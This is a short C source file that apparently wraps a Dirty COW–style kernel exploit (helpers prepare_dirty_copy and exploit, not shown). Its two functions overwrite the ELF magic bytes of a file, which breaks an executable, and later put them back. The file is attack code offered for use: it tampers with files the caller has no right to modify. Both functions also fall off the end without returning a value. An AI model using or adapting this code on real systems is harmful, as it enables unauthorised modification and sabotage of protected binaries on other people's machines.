//
// Created by k.leyfer on 21.06.2017.
//

#include <linux/elf.h>

#include "elf_breaker.h"

int break_elf(const char* path)
{
  struct mem_arg mem_arg;
  if (prepare_dirty_copy(path, path, &mem_arg) == -1)
  {
    LOGV("Error preparing files!");
    return -1;
  }

  strncpy(mem_arg.patch, "\0\0\0\0", strlen(ELFMAG));
  exploit(&mem_arg);
}

int restore_elf(const char* path)
{
  struct mem_arg mem_arg;
  if (prepare_dirty_copy(path, path, &mem_arg) == -1)
  {
    LOGV("Error preparing files!");
    return -1;
  }

  strncpy(mem_arg.patch, ELFMAG, strlen(ELFMAG));
  exploit(&mem_arg);
}
